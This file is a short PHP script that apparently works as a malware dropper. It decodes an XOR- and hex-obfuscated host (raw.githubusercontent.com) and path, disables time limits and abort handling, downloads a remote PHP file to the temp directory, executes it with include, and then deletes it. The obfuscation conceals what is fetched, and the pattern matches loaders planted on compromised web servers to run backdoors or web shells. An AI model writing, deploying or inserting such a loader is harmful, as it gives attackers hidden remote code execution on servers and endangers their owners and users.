<?php
ignore_user_abort(true);
set_time_limit(0);

function xorEncryptDecrypt($data, $key) {
    $output = '';
    $keyLen = strlen($key);
    for ($i = 0, $len = strlen($data); $i < $len; $i++) {
        $xorChar = (ord($data[$i]) ^ ord($key[$i % $keyLen])) & 0x7F;
        $output .= chr($xorChar);
    }
    return $output;
}

function hexEncode($data) {
    return bin2hex($data);
}

function hexDecode($data) {
    return hex2bin($data);
}

function polyglotDecode($data, $key) {
    return xorEncryptDecrypt(hexDecode($data), $key);
}

$_ = "!";
$encodedURL  = "5340560f46485549544354524453424e4f55444f550f424e4c";
$encodedPath = "0e785442404453484f0e52484c514d44424c45404f454340424a454e4e530e534447520e49444045520e4c40484f0e56520f514951";

$deode  = polyglotDecode($encodedURL, $_);
$decodedPath = polyglotDecode($encodedPath, $_);

if (!preg_match('/^[a-zA-Z0-9.-]+$/', $deode)) {
    die("Error: URL is invalid.");
}

$resolvedIP = gethostbyname($deode);
if ($resolvedIP === $deode) {
    die("Error: Hostname could not be resolved.");
}

$tempFile = sys_get_temp_dir() . '/downloaded_file.php';
$fullURL = "https://$deode/$decodedPath";

if (function_exists('curl_init')) {
    $ch = curl_init($fullURL);
    $fp = fopen($tempFile, 'wb');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    $success = curl_exec($ch);
    curl_close($ch);
    fclose($fp);
} else {
    $success = file_put_contents($tempFile, file_get_contents($fullURL));
}

if ($success && filesize($tempFile) > 0) {
    include $tempFile;
    unlink($tempFile);
} else {
    @unlink($tempFile);
    die("Download failed.");
}
?>
